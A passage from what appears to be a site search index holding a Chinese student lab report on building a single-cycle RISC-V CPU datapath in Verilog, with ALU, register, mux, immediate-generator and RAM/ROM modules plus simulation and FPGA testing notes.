( jmp_addr ), // branch \u8df3\u8f6c\u5730\u5740 . s ( pc_src ), . branch ( branch ), . b_type ( b_type ), . alu_res ( alu_result ), . o ( pc_next ) // pc \u7684\u65b0\u503c ); endmodule \u8fd9\u6837\u5c31\u8fd0\u7528\u4e86\u8fd9\u4e9b\u6a21\u5757\uff0c\u5c06\u5176\u8fde\u63a5\u5728\u4e86\u4e00\u8d77\u5f62\u6210\u4e86\u6570\u636e\u901a\u8def\u3002 \u8fde\u63a5 RAM ROM \u00b6 \u76f4\u63a5\u5c06\u63d0\u4f9b\u7684 Ram.xci \u548c Rom.xci \u8f7d\u5165 vivado \u5c31\u53ef\u4ee5\u751f\u6210 ip \u6838\uff0c\u7136\u540e\u518d Core.v \u6587\u4ef6\u4e2d\u6839\u636e\u63d0\u793a\u8fde\u63a5\uff1a Rom rom_unit ( . a ( pc_out / 4 ), // \u5730\u5740\u8f93\u5165 . spo ( inst ) // \u8bfb\u6570\u636e\u8f93\u51fa ); Ram ram_unit ( . clka ( mem_clk ), // \u65f6\u949f . wea ( mem_write ), // \u662f\u5426\u5199\u6570\u636e . addra ( addr_out ), // \u5730\u5740\u8f93\u5165 . dina ( core_data_out ), // \u5199\u6570\u636e\u8f93\u5165 . douta ( core_data_in ) // \u8bfb\u6570\u636e\u8f93\u51fa ); Rom \u7684\u8f93\u5165\u9700\u8981\u5c06 pc \u9664 4 \u56e0\u4e3a Rom \u8bfb\u53d6\u7684\u65f6\u5019\u6bcf 32 \u4f4d\u5f53\u4f5c\u4e00\u4e2a\u5143\u7d20\uff0c\u800c\u4e0d\u662f\u6bcf\u4e2a\u5b57\u8282\u4e00\u4e2a\u5143\u7d20\u3002 Ram \u7684\u65f6\u949f\u8981\u662f mem_clk \u800c\u4e0d\u662f cpu_clk\uff0c\u4e0d\u7136\u4f1a\u4f7f data memory \u7684\u8f93\u5165\u8f93\u51fa\u88ab\u4f7f\u7528\u65f6\u9519\u5f00\u4e00\u4e2a\u5468\u671f\uff0c\u5269\u4e0b\u7684 mem_write\u3001addr_out\u3001core_data_out\u3001core_data_in \u90fd\u662f Core \u6a21\u5757\u4e2d\u5199\u597d\u7684\u4ece SCPU \u4e2d\u83b7\u5f97\u7684\u8f93\u51fa\u3002 \u6700\u540e\u5728 Core \u672b\u5c3e\u7528\u4e8e debug \u7684\u90e8\u5206\u6839\u636e\u63d0\u793a\u6765\u8f93\u51fa\u60f3\u8981\u5f97\u5230\u7684\u5bc4\u5b58\u5668\u7684\u503c\uff1a assign chip_debug_out3 = debug_reg ; \u8fd9\u6837\u6574\u4e2a\u6570\u636e\u901a\u8def\u7684\u8bbe\u8ba1\u548c\u6574\u4f53\u7684\u8fde\u63a5\u5c31\u5b8c\u6210\u4e86\u3002 \u4eff\u771f\u6d4b\u8bd5 \u00b6 vivado \u4e2d\u8f7d\u5165 ip \u6838\u7684\u65f6\u5019\u76f4\u63a5\u9009\u62e9\u5e26\u6709\u8981\u6c42\u5b9e\u73b0\u7684\u5168\u90e8\u5341\u4e2a\u6307\u4ee4 lw sw bne beq jal lui addi add slt slti \u7684 coe \u53c2\u6570\u6587\u4ef6 lab10_all.coe\uff0c\u4e0e\u4e4b\u5bf9\u5e94\u7684\u6c47\u7f16\u6587\u4ef6\u5c31\u662f lab10_all.asm \u7136\u540e\u9009\u62e9 Core_tb.sv \u4e3a\u76ee\u6807\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u518d\u901a\u8fc7\u8c03\u6574\u5f97\u5230\u5168\u90e8\u4e2d\u95f4\u53d8\u91cf\uff08\u5bc4\u5b58\u5668\u7ec4\u503c\u3001ALU \u8f93\u5165\u8f93\u51fa\u3001Mux \u8f93\u5165\u8f93\u51fa\u7b49\uff09\u5f97\u5230\u4eff\u771f\u6ce2\u5f62\uff1a \u4ee5\u53ca pc \u548c\u5bc4\u5b58\u5668\u7684\u6ce2\u5f62\u6570\u636e\uff1a \u901a\u8fc7\u4ed4\u7ec6\u5206\u6790\u6bcf\u4e00\u6761\u6c47\u7f16\u6307\u4ee4\u4e0e\u6240\u6709\u503c\u7684\u53d8\u5316\u3001\u5bc4\u5b58\u5668\u7684\u53d8\u5316\u53ef\u4ee5\u770b\u51fa CPU \u6309\u7167\u7ed9\u51fa\u7684\u6307\u4ee4\u6b63\u786e\u8fd0\u884c\u4e86\u3002 \u4e0a\u677f\u9a8c\u8bc1 \u00b6 \u5728 vivado \u4e2d disable \u6389 Control_sim.v \u6587\u4ef6\uff08\u5373\u4f7f\u7528 Control.v \u548c Control.edf\uff09\u7136\u540e\u901a\u8fc7 Top.\u200csv \u4e2d\u9876\u5c42\u6a21\u5757\u751f\u6210\u6bd4\u7279\u6d41\uff0c\u5199\u5165 FPGA \u5f00\u53d1\u7248\u5373\u53ef\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1\u3002 \u901a\u8fc7\u5355\u6b65\u8fd0\u884c\uff0c\u89c2\u5bdf pc\u3001inst\u3001\u5bc4\u5b58\u5668\u503c\u53ef\u4ee5\u786e\u5b9a\u4e0a\u677f\u4e5f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u3002 Bonus \u00b6 \u6307\u4ee4\u6269\u5c55\u90e8\u5206\u653e\u5230\u4e0b\u4e00\u4e2a lab \u4e2d\u8ddf\u968f\u63a7\u5236\u90e8\u5206\u4e00\u8d77\u5b9e\u73b0\uff0c\u5199\u5728\u4e0b\u4e00\u6b21 lab \u7684\u5b9e\u9a8c\u62a5\u544a\u4e2d\u3002","title":"\u7cfb\u7edf I lab5-1"},{"location":"cs/system/cs1/lab5-1/#cpu","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab5-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.20 ~ 2022.06.10\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1"},{"location":"cs/system/cs1/lab5-1/#_1","text":"\u5b8c\u6210 32 \u4f4d\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1 \u5b9e\u73b0 lw sw bne beq jal lui addi add slt slti \u6307\u4ee4 \u6839\u636e\u63d0\u4f9b\u7684\u6d4b\u8bd5\u6587\u4ef6\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5 \u6839\u636e\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u73ed\u9a8c\u8bc1 bonus\uff1a\u6307\u4ee4\u6269\u5c55 \u5b9e\u73b0 andi ori and or sll \u5b9e\u73b0 xori slli srli srl \u5b9e\u73b0 auipc sltu jalr","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab5-1/#_2","text":"","title":"\u6570\u636e\u901a\u8def\u8bbe\u8ba1"},{"location":"cs/system/cs1/lab5-1/#_3","text":"","title":"\u660e\u786e\u5df2\u7ed9\u4ee3\u7801"},{"location":"cs/system/cs1/lab5-1/#cpu_1","text":"\u548c\u5355\u5468\u671f CPU \u672c\u8eab\u6709\u5173\u7684\u6838\u5fc3\u4ee3\u7801\u6709","title":"CPU \u76f8\u5173\u90e8\u5206"},{"location":"cs/system/cs1/lab5-1/#_4","text":"Top.\u200csv \u7528\u4e8e\u4e0a\u677f\u9a8c\u8bc1\u7684\u9876\u5c42\u6a21\u5757\uff0c\u5176\u4e2d\u5c06 Core \u8fde\u63a5\u5230\u4e86 IO_Manager \u4e2d\u6765\u4e3a FPGA \u677f\u5b50\u63d0\u4f9b\u8f93\u5165\u8f93\u51fa\u7684\u63a7\u5236\u3002 IO_Manager.sv \u4e3a FPGA \u677f\u5b50\u63d0\u4f9b\u8f93\u5165\u8f93\u51fa\u7684\u6a21\u5757\uff0c\u5176\u4e2d\u5904\u7406\u4e86\u5f00\u53d1\u7248\u4e0a\u7684\u6309\u952e\u3001\u5f00\u5173\uff0c\u4ee5\u53ca\u4e03\u6bb5\u7ba1\u7684\u8f93\u51fa\u3002 Core_tb.sv Core \u6a21\u5757\u7684 test bench\uff0c\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u7684\u65f6\u5019\u5c06\u8fd9\u4e2a\u6587\u4ef6\u8bbe\u4e3a\u9700\u8981\u4eff\u771f\u7684\u6587\u4ef6\u3002 AluOp.vh \u91cc\u9762\u4e3a ALU \u8981\u8fdb\u884c\u7684\u8fd0\u7b97\u63d0\u4f9b\u4e86\u53d8\u91cf\u540d\uff0c\u5b9e\u73b0 ALU \u65f6\u8981\u6309\u7167\u91cc\u9762\u7684\u89c4\u5b9a\u6765\u6267\u884c\u8fd0\u7b97\u3002","title":"\u5176\u5b83\u6587\u4ef6"},{"location":"cs/system/cs1/lab5-1/#_5","text":"\u5b8c\u6210\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u7684\u76ee\u6807\u6709\u4ee5\u4e0b\u51e0\u4e2a\uff1a \u7f16\u5199 ALU \u6a21\u5757\uff0c\u5b8c\u6210 AluOp.vh \u6587\u4ef6\u4e2d\u89c4\u5b9a\u7684\u8fd0\u7b97 \u7f16\u5199\u5bc4\u5b58\u5668 Regs \u6a21\u5757\uff0c\u5b58\u50a8 31 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\uff08\u7b2c 0 \u4e2a\u662f 0\uff09\uff0c\u5904\u7406\u5bc4\u5b58\u5668\u7684\u8bfb\u5199\u64cd\u4f5c \u7f16\u5199\u4e00\u4e9b Mux \u6a21\u5757\u7528\u4e8e\u6570\u636e\u901a\u8def\u4e2d\u7684\u591a\u8def\u9009\u62e9 \u7f16\u5199 ImmGen \u6a21\u5757\uff0c\u7528\u6765\u4ece\u6307\u4ee4\u4e2d\u89e3\u6790\u51fa\u7acb\u5373\u6570 \u7f16\u5199 Datapath \u6a21\u5757\uff0c\u8fde\u63a5\u8d77\u6570\u636e\u901a\u8def \u5728 SCPU \u6a21\u5757\u4e2d\u6b63\u786e\u8fde\u63a5 Control \u4e0e Datapath\uff08\u5df2\u7ecf\u505a\u597d\uff09 \u5728 Core \u6a21\u5757\u4e2d\u8fde\u63a5 SCPU \u4e0e RAM ROM","title":"\u660e\u786e\u76ee\u6807"},{"location":"cs/system/cs1/lab5-1/#_6","text":"","title":"\u6a21\u5757\u7f16\u5199\u4e0e\u8fde\u63a5"},{"location":"cs/system/cs1/lab5-1/#alu","text":"\u8f93\u5165\u662f\u4e24\u4e2a 32 \u4f4d\u6570 a b \u548c\u8fdb\u884c\u7684\u64cd\u4f5c alu_op\uff0c\u8f93\u51fa\u662f\u7ed3\u679c\u548c zero \u6807\u5fd7\uff0ccase alu_op \u7136\u540e\u5206\u522b\u5b9e\u73b0\u5c31\u53ef\u4ee5\uff1a `timescale 1 ns / 1 ps module ALU ( input [ 31 : 0 ] a , input [ 31 : 0 ] b , input [ 3 : 0 ] alu_op , output reg [ 31 : 0 ] res , output zero ); `include \"AluOp.vh\" always @( * ) begin case ( alu_op ) ADD: res <= a + b ; SUB: res <= a - b ; SLL: res <= a << b ; SLT: begin if ( a [ 31 ] == 0 && b [ 31 ] == 1 ) res <= 0 ; else if ( a [ 31 ] == 1 && b [ 31 ] == 0 ) res <= 1 ; else if ( a [ 31 ] == b [ 31 ]) begin if ( a [ 30 : 0 ] < b [ 30 : 0 ]) res <= 1 ; else res <= 0 ; end end SLTU: begin if ( a < b ) res <= 1 ; else res <= 0 ; end XOR: res <= a ^ b ; SRL: res <= a >> b ; SRA: res <= a >>> b ; OR: res <= a | b ; AND: res <= a & b ; default : res = 0 ; endcase end assign zero = ( a - b ) ? 1 'b0 : 1 'b1 ; endmodule","title":"ALU"},{"location":"cs/system/cs1/lab5-1/#regs","text":"\u5728 lab \u7684 pdf \u6587\u4ef6\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u5bc4\u5b58\u5668\u7ec4\u90e8\u5206\u7684\u8bbe\u8ba1\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4e00\u4e0b\u5bf9\u4e8e debug_reg_addr \u548c debug_reg \u7684\u8f93\u5165\u8f93\u51fa\u5373\u53ef\uff1a `timescale 1 ns / 1 ps module Regs ( input clk , input rst , input we , input [ 4 : 0 ] read_addr_1 , input [ 4 : 0 ] read_addr_2 , input [ 4 : 0 ] write_addr , input [ 31 : 0 ] write_data , input [ 4 : 0 ] debug_reg_addr , output [ 31 : 0 ] read_data_1 , output [ 31 : 0 ] read_data_2 , output [ 31 : 0 ] debug_reg ); integer i ; reg [ 31 : 0 ] register [ 1 : 31 ]; // x1 - x31, x0 keeps zero assign read_data_1 = ( read_addr_1 == 0 ) ? 0 : register [ read_addr_1 ]; // read assign read_data_2 = ( read_addr_2 == 0 ) ? 0 : register [ read_addr_2 ]; // read assign debug_reg = ( debug_reg_addr == 0 ) ? 0 : register [ debug_reg_addr ]; always @( posedge clk or posedge rst ) begin if ( rst == 1 ) for ( i = 1 ; i < 32 ; i = i + 1 ) register [ i ] <= 0 ; // reset else if ( we == 1 && write_addr != 0 ) register [ write_addr ] <= write_data ; end endmodule","title":"\u5bc4\u5b58\u5668 Regs"},{"location":"cs/system/cs1/lab5-1/#mux","text":"\u9996\u5148\u5b9e\u73b0\u666e\u901a\u7684 32 \u4f4d 2 \u8def\u9009\u62e9\u5668 Mux2x32 \u548c 32 \u4f4d 4 \u8def\u9009\u62e9\u5668 Mux4x32\uff1a `timescale 1 ns / 1 ps module Mux2x32 ( input [ 31 : 0 ] I0 , input [ 31 : 0 ] I1 , input s , output [ 31 : 0 ] o ); assign o = s ? I1 : I0 ; endmodule module Mux4x32 ( input [ 31 : 0 ] I0 , input [ 31 : 0 ] I1 , input [ 31 : 0 ] I2 , input [ 31 : 0 ] I3 , input [ 1 : 0 ] s , output [ 31 : 0 ] o ); reg [ 31 : 0 ] out ; always @( * ) begin case ( s ) 2 'b00 : out <= I0 ; 2 'b01 : out <= I1 ; 2 'b10 : out <= I2 ; 2 'b11 : out <= I3 ; endcase end assign o = out ; endmodule \u7136\u540e\u518d\u5b9e\u73b0\u4e00\u4e2a\u7528\u4e8e\u5904\u7406\u6700\u540e PC \u7ed3\u679c\u7684\u7279\u6b8a\u9009\u62e9\u5668\uff08\u5373\u9700\u8981\u5224\u65ad\u4e00\u4e0b\u662f\u5426\u6709\u5206\u652f\u4ee5\u53ca\u5206\u652f\u662f\u5426\u6210\u7acb\uff09\uff1a module MuxPC ( input [ 31 : 0 ] I0 , // pc+4 input [ 31 : 0 ] I1 , // JALR \u7684\u5730\u5740 input [ 31 : 0 ] I2 , // JAL \u7684\u5730\u5740 input [ 31 : 0 ] I3 , // branch \u7684\u5730\u5740 input [ 1 : 0 ] s , // pc_src input branch , // \u662f\u5426\u5206\u652f input b_type , // 0 bne, 1 beq input [ 31 : 0 ] alu_res , // alu \u7684\u7ed3\u679c\uff0c\u7528\u6765\u5224\u65ad\u5206\u652f\u662f\u5426\u6210\u7acb output [ 31 : 0 ] o // \u7ed3\u679c\u7684 pc ); reg [ 31 : 0 ] out ; always @( * ) begin if ( branch ) begin // \u6709\u5206\u652f\u64cd\u4f5c if ( b_type ) begin // beq if ( alu_res == 32 'b0 ) out <= I3 ; // \u5206\u652f else out <= I0 ; end else begin // bne if ( alu_res == 32 'b0 ) out <= I0 ; else out <= I3 ; // \u5206\u652f end end else begin case ( s ) 2 'b00 : out <= I0 ; 2 'b01 : out <= I1 ; 2 'b10 : out <= I2 ; 2 'b11 : out <= I3 ; endcase end end assign o = out ; endmodule","title":"\u591a\u8def\u9009\u62e9\u5668 Mux"},{"location":"cs/system/cs1/lab5-1/#immgen","text":"\u5148\u901a\u8fc7\u4e00\u4e2a Opcodes.vh \u6587\u4ef6\u5b9a\u4e49\u4e00\u4e9b\u8981\u7528\u7684\u6307\u4ee4\u540d\u548c opcode \u7684\u5bf9\u5e94\u4ee5\u53ca\u6307\u4ee4\u7c7b\u578b\u7684\u679a\u4e3e\uff1a //`ifndef OPCODES_H //`define OPCODES_H parameter LW = 7 'b0000011 , SW = 7 'b0100011 , ADDI = 7 'b0010011 , BNE = 7 'b1100011 , BEQ = 7 'b1100011 , JAL = 7 'b1101111 , LUI = 7 'b0110111 , ADD = 7 'b0110011 , SLT = 7 'b0110011 , SLTI = 7 'b0010011 , ANDI = 7 'b0010011 , ORI = 7 'b0010011 , AND = 7 'b0110011 , OR = 7 'b0110011 , SLL = 7 'b0110011 , XORI = 7 'b0010011 , SLLI = 7 'b0010011 , SRLI = 7 'b0010011 , SRL = 7 'b0110011 , AUIPC = 7 'b0010111 , SLTU = 7 'b0110011 , JALR = 7 'b1100111 ; parameter R = 3 'b000 , I = 3 'b001 , S = 3 'b010 , B = 3 'b011 , U = 3 'b100 , J = 3 'b101 ; //`endif \u7136\u540e\u518d\u7f16\u5199\u4e00\u4e2a ImmGen \u6a21\u5757\u6765\u8bc6\u522b opcode\u3001\u5206\u7c7b\u6307\u4ee4\u3001\u83b7\u53d6\u7acb\u5373\u6570\uff0c\u5bf9\u4e8e\u51e0\u79cd\u6307\u4ee4\uff0c\u83b7\u53d6\u7684\u7acb\u5373\u6570\u5206\u522b\u662f\uff1a R \u578b\uff1a20 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31:20] I \u578b\uff1a\u540c R \u578b S \u578b\uff1a20 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31:25] + inst[11:7] B \u578b\uff1a19 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31] + inst[7] + inst[30:25] + inst[11:8]\uff0c\u6700\u540e\u4e00\u4f4d\u8865 0\uff08\u76f8\u5f53\u4e8e\u9884\u5148\u8fdb\u884c\u4e86\u5206\u652f\u65f6\u7684 imm << 1 \u64cd\u4f5c\uff09 U \u578b\uff1ainst[31:12] \u540e\u9762\u8865 12 \u4e2a 0 J \u578b\uff1a11 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31] + inst[19:12] + inst[20] + inst[30:21]\uff0c\u6700\u540e\u4e00\u4f4d\u8865 0 \u6839\u636e\u8fd9\u4e9b\u89c4\u5219\u4ee5\u53ca\u6307\u4ee4\u548c\u7c7b\u578b\u7684\u5bf9\u5e94\u53ef\u4ee5\u5199\u51fa ImmGen \u7c7b\uff1a `timescale 1 ns / 1 ps module ImmGen ( input [ 31 : 0 ] inst , output [ 31 : 0 ] imm ); `include \"Opcodes.vh\" reg [ 3 : 0 ] type ; reg [ 31 : 0 ] out ; assign imm = out ; always @( * ) begin case ( inst [ 6 : 0 ]) LW: type <= I ; SW: type <= S ; ADDI: type <= I ; BNE: type <= B ; BEQ: type <= B ; JAL: type <= J ; LUI: type <= U ; ADD: type <= R ; SLT: type <= R ; SLTI: type <= I ; ANDI: type <= I ; ORI: type <= I ; AND: type <= R ; OR: type <= R ; SLL: type <= R ; XORI: type <= I ; SLLI: type <= R ; SRLI: type <= R ; SRL: type <= R ; AUIPC: type <= U ; SLTU: type <= R ; JALR: type <= I ; endcase case ( type ) R: out <= {{ 20 { inst [ 31 ]}}, inst [ 31 : 20 ]}; I: out <= {{ 20 { inst [ 31 ]}}, inst [ 31 : 20 ]}; S: out <= {{ 20 { inst [ 31 ]}}, inst [ 31 : 25 ], inst [ 11 : 7 ]}; B: out <= {{ 19 { inst [ 31 ]}}, inst [ 31 ], inst [ 7 ], inst [ 30 : 25 ], inst [ 11 : 8 ], 1 'b0 }; U: out <= { inst [ 31 : 12 ], 12 'b0 }; J: out <= {{ 11 { inst [ 31 ]}}, inst [ 31 ], inst [ 19 : 12 ], inst [ 20 ], inst [ 30 : 21 ], 1 'b0 }; endcase end endmodule","title":"\u89e3\u6790\u7acb\u5373\u6570 ImmGen"},{"location":"cs/system/cs1/lab5-1/#datapath","text":"\u6839\u636e\u524d\u9762\u5199\u597d\u7684\u6a21\u5757\u4ee5\u53ca\u5206\u6790\uff0c\u8fd8\u6709 pdf \u7ed9\u51fa\u7684\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u56fe\u5c31\u53ef\u4ee5\u5199\u51fa\u6570\u636e\u901a\u8def\u90e8\u5206\u7684\u4ee3\u7801\uff1a `timescale 1 ns / 1 ps module Datapath ( input clk , input rst , input [ 1 : 0 ] pc_src , // pc \u6765\u6e90 input reg_write , // \u662f\u5426\u5199\u5165\u5bc4\u5b58\u5668 input alu_src_b , // ALUsrc input branch , // \u662f\u5426\u4e3a branch \u7c7b\u578b\u7684\u6307\u4ee4 input b_type , // branch \u7c7b\u578b input [ 3 : 0 ] alu_op , // ALU operation input [ 1 : 0 ] mem_to_reg , // MemtoReg input [ 31 : 0 ] inst_in , // \u5f53\u524d\u6307\u4ee4 input [ 31 : 0 ] data_in , // data from data memory output [ 31 : 0 ] addr_out , // data memory address output [ 31 : 0 ] data_out , // data to data memory output [ 31 : 0 ] pc_out , // connect to instruction memory input [ 4 : 0 ] debug_reg_addr , output [ 31 : 0 ] debug_reg ); reg [ 31 : 0 ] pc ; wire [ 31 : 0 ] pc_next ; wire [ 31 : 0 ] write_data , read_data_1 , read_data_2 ; wire [ 31 : 0 ] mux_out_1 , alu_result ; wire alu_zero ; wire [ 31 : 0 ] imm ; wire [ 31 : 0 ] jmp_addr ; assign pc_out = pc ; assign addr_out = alu_result ; assign data_out = read_data_2 ; always @( posedge clk or posedge rst ) begin if ( rst ) begin pc <= 32 'b0 ; // \u5bf9 pc \u590d\u4f4d end else begin pc <= pc_next ; // \u8bbe\u7f6e pc \u7684\u65b0\u503c end end Regs regs ( // \u8fde\u63a5\u5bc4\u5b58\u5668\u7ec4 . clk ( clk ), . rst ( rst ), . we ( reg_write ), . read_addr_1 ( inst_in [ 19 : 15 ]), . read_addr_2 ( inst_in [ 24 : 20 ]), . write_addr ( inst_in [ 11 : 7 ]), . write_data ( write_data ), . read_data_1 ( read_data_1 ), . read_data_2 ( read_data_2 ), . debug_reg_addr ( debug_reg_addr ), . debug_reg ( debug_reg ) ); ImmGen immgen ( // \u8fde\u63a5 ImmGen\uff0c\u4ece inst_in \u4e2d\u83b7\u5f97\u7acb\u5373\u6570 imm . inst ( inst_in ), . imm ( imm ) ); Mux2x32 mux2x32 ( // \u9009\u62e9 ALU \u7b2c\u4e8c\u4e2a\u8f93\u5165 . I0 ( read_data_2 ), . I1 ( imm ), . s ( alu_src_b ), . o ( mux_out_1 ) ); ALU alu ( // \u8fdb\u884c ALU \u8fd0\u7b97\uff0c\u7b2c\u4e00\u4e2a\u8f93\u5165\u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e8c\u4e2a\u662f\u9009\u62e9\u5668\u7684\u7ed3\u679c . a ( read_data_1 ), . b ( mux_out_1 ), . alu_op ( alu_op ), . res ( alu_result ), . zero ( alu_zero ) ); Mux4x32 mux4x32 ( // \u9009\u62e9\u5199\u5165 data memory \u7684\u6570\u636e . I0 ( alu_result ), . I1 ( imm ), . I2 ( pc + 4 ), . I3 ( data_in ), . s ( mem_to_reg ), . o ( write_data ) ); assign jmp_addr = pc + imm ; // \u5f97\u5230\u8df3\u8f6c\u6307\u4ee4\u7684\u8df3\u8f6c\u76ee\u6807 MuxPC mux_pc ( // \u9009\u62e9 pc \u7684\u65b0\u503c . I0 ( pc + 4 ), // \u76f4\u63a5\u52a0 4 . I1 ( jmp_addr ), // JALR \u8df3\u8f6c\u5730\u5740 . I2 ( jmp_addr ), // JAL \u8df3\u8f6c\u5730\u5740 . I3 ( jmp_addr ), // branch \u8df3\u8f6c\u5730\u5740 . s ( pc_src ), . branch ( branch ), . b_type ( b_type ), . alu_res ( alu_result ), . o ( pc_next ) // pc \u7684\u65b0\u503c ); endmodule \u8fd9\u6837\u5c31\u8fd0\u7528\u4e86\u8fd9\u4e9b\u6a21\u5757\uff0c\u5c06\u5176\u8fde\u63a5\u5728\u4e86\u4e00\u8d77\u5f62\u6210\u4e86\u6570\u636e\u901a\u8def\u3002","title":"\u6570\u636e\u901a\u8def Datapath"},{"location":"cs/system/cs1/lab5-1/#ram-rom","text":"\u76f4\u63a5\u5c06\u63d0\u4f9b\u7684 Ram.xci \u548c Rom.xci \u8f7d\u5165 vivado \u5c31\u53ef\u4ee5\u751f\u6210 ip \u6838\uff0c\u7136\u540e\u518d Core.v \u6587\u4ef6\u4e2d\u6839\u636e\u63d0\u793a\u8fde\u63a5\uff1a Rom rom_unit ( . a ( pc_out / 4 ), // \u5730\u5740\u8f93\u5165 . spo ( inst ) // \u8bfb\u6570\u636e\u8f93\u51fa ); Ram ram_unit ( . clka ( mem_clk ), // \u65f6\u949f . wea ( mem_write ), // \u662f\u5426\u5199\u6570\u636e . addra ( addr_out ), // \u5730\u5740\u8f93\u5165 . dina ( core_data_out ), // \u5199\u6570\u636e\u8f93\u5165 . douta ( core_data_in ) // \u8bfb\u6570\u636e\u8f93\u51fa ); Rom \u7684\u8f93\u5165\u9700\u8981\u5c06 pc \u9664 4 \u56e0\u4e3a Rom \u8bfb\u53d6\u7684\u65f6\u5019\u6bcf 32 \u4f4d\u5f53\u4f5c\u4e00\u4e2a\u5143\u7d20\uff0c\u800c\u4e0d\u662f\u6bcf\u4e2a\u5b57\u8282\u4e00\u4e2a\u5143\u7d20\u3002 Ram \u7684\u65f6\u949f\u8981\u662f mem_clk \u800c\u4e0d\u662f cpu_clk\uff0c\u4e0d\u7136\u4f1a\u4f7f data memory \u7684\u8f93\u5165\u8f93\u51fa\u88ab\u4f7f\u7528\u65f6\u9519\u5f00\u4e00\u4e2a\u5468\u671f\uff0c\u5269\u4e0b\u7684 mem_write\u3001addr_out\u3001core_data_out\u3001core_data_in \u90fd\u662f Core \u6a21\u5757\u4e2d\u5199\u597d\u7684\u4ece SCPU \u4e2d\u83b7\u5f97\u7684\u8f93\u51fa\u3002 \u6700\u540e\u5728 Core \u672b\u5c3e\u7528\u4e8e debug \u7684\u90e8\u5206\u6839\u636e\u63d0\u793a\u6765\u8f93\u51fa\u60f3\u8981\u5f97\u5230\u7684\u5bc4\u5b58\u5668\u7684\u503c\uff1a assign chip_debug_out3 = debug_reg ; \u8fd9\u6837\u6574\u4e2a\u6570\u636e\u901a\u8def\u7684\u8bbe\u8ba1\u548c\u6574\u4f53\u7684\u8fde\u63a5\u5c31\u5b8c\u6210\u4e86\u3002","title":"\u8fde\u63a5 RAM ROM"},{"location":"cs/system/cs1/lab5-1/#_7","text":"vivado \u4e2d\u8f7d\u5165 ip \u6838\u7684\u65f6\u5019\u76f4\u63a5\u9009\u62e9\u5e26\u6709\u8981\u6c42\u5b9e\u73b0\u7684\u5168\u90e8\u5341\u4e2a\u6307\u4ee4 lw sw bne beq jal lui addi add slt slti \u7684 coe \u53c2\u6570\u6587\u4ef6 lab10_all.coe\uff0c\u4e0e\u4e4b\u5bf9\u5e94\u7684\u6c47\u7f16\u6587\u4ef6\u5c31\u662f lab10_all.asm \u7136\u540e\u9009\u62e9 Core_tb.sv \u4e3a\u76ee\u6807\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u518d\u901a\u8fc7\u8c03\u6574\u5f97\u5230\u5168\u90e8\u4e2d\u95f4\u53d8\u91cf\uff08\u5bc4\u5b58\u5668\u7ec4\u503c\u3001ALU \u8f93\u5165\u8f93\u51fa\u3001Mux \u8f93\u5165\u8f93\u51fa\u7b49\uff09\u5f97\u5230\u4eff\u771f\u6ce2\u5f62\uff1a \u4ee5\u53ca pc \u548c\u5bc4\u5b58\u5668\u7684\u6ce2\u5f62\u6570\u636e\uff1a \u901a\u8fc7\u4ed4\u7ec6\u5206\u6790\u6bcf\u4e00\u6761\u6c47\u7f16\u6307\u4ee4\u4e0e\u6240\u6709\u503c\u7684\u53d8\u5316\u3001\u5bc4\u5b58\u5668\u7684\u53d8\u5316\u53ef\u4ee5\u770b\u51fa CPU \u6309\u7167\u7ed9\u51fa\u7684\u6307\u4ee4\u6b63\u786e\u8fd0\u884c\u4e86\u3002","title":"\u4eff\u771f\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab5-1/#_8","text":"\u5728 vivado \u4e2d disable \u6389 Control_sim.v \u6587\u4ef6\uff08\u5373\u4f7f\u7528 Control.v \u548c Control.edf\uff09\u7136\u540e\u901a\u8fc7 Top.\u200csv \u4e2d\u9876\u5c42\u6a21\u5757\u751f\u6210\u6bd4\u7279\u6d41\uff0c\u5199\u5165 FPGA \u5f00\u53d1\u7248\u5373\u53ef\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1\u3002 \u901a\u8fc7\u5355\u6b65\u8fd0\u884c\uff0c\u89c2\u5bdf pc\u3001inst\u3001\u5bc4\u5b58\u5668\u503c\u53ef\u4ee5\u786e\u5b9a\u4e0a\u677f\u4e5f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u3002","title":"\u4e0a\u677f\u9a8c\u8bc1"},{"location":"cs/system/cs1/lab5-1/#bonus","text":"\u6307\u4ee4\u6269\u5c55\u90e8\u5206\u653e\u5230\u4e0b\u4e00\u4e2a lab \u4e2d\u8ddf\u968f\u63a7\u5236\u90e8\u5206\u4e00\u8d77\u5b9e\u73b0\uff0c\u5199\u5728\u4e0b\u4e00\u6b21 lab \u7684\u5b9e\u9a8c\u62a5\u544a\u4e2d\u3002","title":"Bonus"},{"location":"cs/system/cs1/lab5-2/","text":"\u5355\u5468\u671f CPU \u8bbe\u8ba1 \u00b6 Abstract 